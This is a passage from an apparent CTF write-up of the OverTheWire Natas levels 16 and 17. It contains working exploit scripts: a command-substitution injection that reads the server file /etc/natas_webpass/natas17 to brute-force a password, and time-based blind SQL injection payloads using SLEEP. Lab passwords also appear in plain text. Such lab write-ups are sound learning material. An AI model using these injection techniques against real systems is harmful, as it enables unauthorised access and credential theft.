+<p>Starting this off by going to: <a href="http://natas16.natas.labs.overthewire.org/">http://natas16.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas16
+Pass: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+</code></pre></td></tr></table>
+</div>
+</div><p>Another search similar to <a href="https://noopz.github.io/natas_challenges_part1/#natas9" rel="">natas9</a> and <a href="https://noopz.github.io/natas_challenges_part2/#natas10" rel="">natas10</a>. Looking over the source of the page it seems there&rsquo;s now a better filter in place:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
+<span class="nv">$key </span><span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;needle&#34;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$key </span><span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;needle&#34;</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$key </span><span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;`\&#39;&#34;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s2">&#34;Input contains an illegal character!&#34;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">passthru</span><span class="p">(</span><span class="s2">&#34;grep -i </span><span class="se">\&#34;</span><span class="si">$key\</span><span class="s2">&#34;</span> <span class="nx">dictionary</span><span class="o">.</span><span class="nx">txt</span><span class="s2">&#34;);
+</span><span class="s2">    }
+</span><span class="s2">}
+</span><span class="s2">?&gt;
+</span></code></pre></td></tr></table>
+</div>
+</div><p>After quite a bit of reading, seems there no explicit way around <a href="https://www.php.net/manual/en/function.preg-match.php" target="_blank" rel="noopener noreffer">preq_match</a> or any way to skip that check. Therefore a deeper look into what it&rsquo;s trying to filter out is needed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">if(preg_match(&#39;/[;|<span class="err">&amp;</span>`\&#39;&#34;]/&#39;,$key)) {
+</code></pre></td></tr></table>
+</div>
+</div><p>The regex filter is removing the obvious ways to execute any arbitrary command - no more using <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>&quot;</code>, <code>'</code>, or <code>&quot;</code>. What is important to note is that <code>(</code>, <code>)</code> and <code>$</code> are not filtered. Most of the time <a href="https://en.wikipedia.org/wiki/Command_substitution" target="_blank" rel="noopener noreffer">command substitution</a> is done with backticks (i.e.: `<code>…</code>`), however those are filtered. However an alternative using <code>$(…)</code> is still entirely possible.</p>
+<p>A quick explanation of command substitution: <code>$(…)</code> returns the output from the command and print it to <code>stdout</code>. This will be useful to leak information by having the command substitution <code>grep</code> on a different file, return it&rsquo;s output to <code>stdout</code> and use that as input to the original command that was going to be run by the server.</p>
+<p>In other words, if we have a file on the server <code>a.txt</code>, which contains: <code>54234asdfe</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="k">$(</span>grep a makebelieve.txt<span class="k">)</span> will <span class="k">return</span> <span class="s2">&#34;54234asdfe&#34;</span>
+<span class="k">$(</span>grep z makebelieve.txt<span class="k">)</span> will <span class="k">return</span> <span class="s2">&#34;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>If we combine that with what the server wants to run:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">grep -i <span class="k">$(</span>grep a makebelieve.txt<span class="k">)</span> dictonary.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>This becomes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">grep -i 54234asdfe dictonary.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>Which will not match anything in the dictionary, in turn that confirms the existence of the letter <code>a</code> in the <code>makebelieve.txt</code>. If we apply the same thing with the <code>z</code>, it will return the contents of the entire dictionary, meaning there is no match in <code>makebelieve.txt</code></p>
+<p>Another thing worth nothing is that <code>grep</code> is friendly to <a href="https://en.wikipedia.org/wiki/Regular_expression" target="_blank" rel="noopener noreffer">regular expressions</a>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="o">$</span><span class="p">(</span><span class="n">grep</span> <span class="n">^5</span> <span class="n">a.txt</span><span class="p">)</span> <span class="n">matches</span> <span class="n">when</span> <span class="n">it</span> <span class="n">starts</span> <span class="n">with</span> <span class="n">the</span> <span class="n">string</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Conceptually this is very similar to what was just done with <a href="https://noopz.github.io/natas_challenges_part3/#natas15" rel="">natas15</a>, but instead of Blind SQL, it&rsquo;s more of a blind Blind Command Injection.</p>
+<p>The python script from <code>natas15</code> should be usable with some tweaks to the parameters.</p>
+<p>Once again with the theory out of the way, time for some code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="n">SITE</span> <span class="o">=</span> <span class="s2">&#34;http://natas16.natas.labs.overthewire.org/index.php?needle=&#34;</span>
+<span class="n">USER</span> <span class="o">=</span> <span class="s2">&#34;natas16&#34;</span>
+<span class="n">PASSW</span> <span class="o">=</span> <span class="s2">&#34;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#34;</span>
+<span class="n">PASS_MGR</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPPasswordMgrWithDefaultRealm</span><span class="p">()</span>
+<span class="n">PASS_MGR</span><span class="o">.</span><span class="n">add_password</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">SITE</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PASSW</span><span class="p">)</span>
+<span class="n">AUTH_HANDLER</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPBasicAuthHandler</span><span class="p">(</span><span class="n">PASS_MGR</span><span class="p">)</span>
+<span class="n">OPENER</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">AUTH_HANDLER</span><span class="p">)</span>
+<span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">OPENER</span><span class="p">)</span>
+<span class="n">CHARSET</span> <span class="o">=</span> <span class="s1">&#39;wWabcdefghijklmnopqrstuvxyz1234567890QERTYUIOPASDFGHJKLZXCVBNM&#39;</span>
+<span class="k">def</span> <span class="nf">get_filtered_chars</span><span class="p">():</span>
+    <span class="n">filtered_chars</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Trying </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">char</span><span class="p">))</span>
+        <span class="c1"># Filter out the characters by trying to match with the command sub version of grep</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;$(grep &#39;</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="s1">&#39;  /etc/natas_webpass/natas17)&#39;</span><span class="p">)</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">SITE</span> <span class="o">+</span> <span class="n">payload</span>
+        <span class="n">html_result</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">html_result</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;apple&#34;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">filtered_chars</span> <span class="o">=</span> <span class="n">filtered_chars</span> <span class="o">+</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Current chars: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">filtered_chars</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">filtered_chars</span>
+
+<span class="k">def</span> <span class="nf">brute_force_password</span><span class="p">(</span><span class="n">filtered_chars</span><span class="p">):</span>
+    <span class="n">bruteforced</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="k">while</span> <span class="n">still_forcing</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">filtered_chars</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Trying </span><span class="si">%s</span><span class="s2"> at index: </span><span class="si">%d</span><span class="se">\r</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">index</span><span class="p">))</span>
+            <span class="c1"># Get the order of the characters based on the filtered list and some regex</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;$(grep ^&#39;</span> <span class="o">+</span> <span class="n">bruteforced</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="s1">&#39; /etc/natas_webpass/natas17)&#39;</span><span class="p">)</span>
+            <span class="n">target</span> <span class="o">=</span> <span class="n">SITE</span> <span class="o">+</span> <span class="n">payload</span>
+            <span class="n">html_result</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">html_result</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;apple&#34;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="n">bruteforced</span> <span class="o">=</span> <span class="n">bruteforced</span> <span class="o">+</span> <span class="n">char</span>
+                <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Current password: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">bruteforced</span><span class="p">)</span>
+                <span class="n">index</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span>
+                <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">True</span>
+                <span class="k">break</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">return</span> <span class="n">bruteforced</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">filtered_chars</span> <span class="o">=</span> <span class="n">get_filtered_chars</span><span class="p">()</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">brute_force_password</span><span class="p">(</span><span class="n">filtered_chars</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;**** PASSWORD DISCOVERED ***&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And now for the password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">**** PASSWORD DISCOVERED ***
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="natas17">natas17</h2>
+<p>Starting this off by going to: <a href="http://natas17.natas.labs.overthewire.org/">http://natas17.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas17
+Pass: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+</code></pre></td></tr></table>
+</div>
+</div><p>This one is just like <a href="https://noopz.github.io/natas_challenges_part3/#natas15" rel="">natas15</a>, except for one challenging change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
+<span class="cm">/*
+</span><span class="cm">CREATE TABLE `users` (
+</span><span class="cm">  `username` varchar(64) DEFAULT NULL,
+</span><span class="cm">  `password` varchar(64) DEFAULT NULL
+</span><span class="cm">);
+</span><span class="cm">*/</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$link </span><span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas17&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
+    <span class="nx">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas17&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
+    <span class="nv">$query </span><span class="o">=</span> <span class="s2">&#34;SELECT * from users where username=</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$res </span><span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">//echo &#34;This user exists.&lt;br&gt;&#34;;
+</span><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">//echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;
+</span><span class="c1"></span>    <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">//echo &#34;Error in query.&lt;br&gt;&#34;;
+</span><span class="c1"></span>    <span class="p">}</span>
+
+    <span class="nx">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Since it no longer leaks information we need to use a slightly different approach. This time we need to introduce a means of getting some sort of hint as to what is happening. Lots of databases make this very easy with the inclusion of a &ldquo;SLEEP&rdquo;, it forces the database to sleep before returning a query. These are considered time-based <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection" target="_blank" rel="noopener noreffer">Blind SQL Injection attacks</a></p>
+<p>Using the queries from <code>natas15</code>, we just need to wrap them in a way that adds a sleep if we match one of the characters we are brute forcing:</p>
+<p>Query for finding characters with wildcards with a sleep:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s2">&#34;natas16&#34;</span> <span class="k">AND</span> <span class="k">if</span><span class="p">(</span><span class="n">password</span> <span class="k">LIKE</span> <span class="nb">BINARY</span> <span class="s2">&#34;%&lt;character&gt;%, SLEEP(5), 0)&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Query for finding positions with a sleep:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s2">&#34;natas16&#34;</span> <span class="k">AND</span> <span class="k">if</span><span class="p">(</span><span class="n">password</span> <span class="k">LIKE</span> <span class="nb">BINARY</span> <span class="s2">&#34;&lt;knowncharacters&gt; + &lt;character&gt;%, SLEEP(5), 0)&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Since there is now a sleeping instead of expecting some output from the server, the python script will need to change to time the request to the server and if is greater or equal to the sleep value consider that to be a match.</p>
+<p>Putting that together in a python script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">from</span> <span class="nn">timeit</span> <span class="kn">import</span> <span class="n">default_timer</span> <span class="k">as</span> <span class="n">timer</span>
+<span class="n">SITE</span> <span class="o">=</span> <span class="s2">&#34;http://natas17.natas.labs.overthewire.org/index.php?debug&amp;&#34;</span>
+<span class="n">USER</span> <span class="o">=</span> <span class="s2">&#34;natas17&#34;</span>
+<span class="n">PASSW</span> <span class="o">=</span> <span class="s2">&#34;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#34;</span>
+<span class="n">PASS_MGR</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPPasswordMgrWithDefaultRealm</span><span class="p">()</span>
+<span class="n">PASS_MGR</span><span class="o">.</span><span class="n">add_password</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">SITE</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PASSW</span><span class="p">)</span>
+<span class="n">h</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPHandler</span><span class="p">(</span><span class="n">debuglevel</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
+<span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">opener</span><span class="p">)</span>
+<span class="n">AUTH_HANDLER</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPBasicAuthHandler</span><span class="p">(</span><span class="n">PASS_MGR</span><span class="p">)</span>
+<span class="n">OPENER</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">AUTH_HANDLER</span><span class="p">)</span>
+<span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">OPENER</span><span class="p">)</span>
+<span class="n">CHARSET</span> <span class="o">=</span> <span class="s1">&#39;wWabcdefghijklmnopqrstuvxyz1234567890QERTYUIOPASDFGHJKLZXCVBNM&#39;</span>
+
+<span class="k">def</span> <span class="nf">get_filtered_chars</span><span class="p">():</span>
+    <span class="n">filtered_chars</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Trying </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">char</span><span class="p">))</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;username=natas18&#34;%20AND</span><span class="si">%20i</span><span class="s1">f(password%20LIKE%20BINARY%20&#34;%&#39;</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="s1">&#39;%&#34;,SLEEP(5),0)%20AND%20&#34;1=1&#39;</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">SITE</span> <span class="o">+</span> <span class="n">payload</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+        <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">end</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">end</span><span class="o">-</span><span class="n">start</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span>
+            <span class="n">filtered_chars</span> <span class="o">=</span> <span class="n">filtered_chars</span> <span class="o">+</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Current chars: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">filtered_chars</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">filtered_chars</span>
+
+<span class="k">def</span> <span class="nf">brute_force_password</span><span class="p">(</span><span class="n">filtered_chars</span><span class="p">):</span>
+    <span class="n">bruteforced</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="k">while</span> <span class="n">still_forcing</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">filtered_chars</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Trying </span><span class="si">%s</span><span class="s2"> at index: </span><span class="si">%d</span><span class="se">\r</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">index</span><span class="p">))</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;username=natas18&#34;%20AND</span><span class="si">%20i</span><span class="s1">f(password%20LIKE%20BINARY%20&#34;&#39;</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">bruteforced</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="s1">&#39;%&#34;,SLEEP(5),0)%20AND%20&#34;1=1&#39;</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">SITE</span> <span class="o">+</span> <span class="n">payload</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
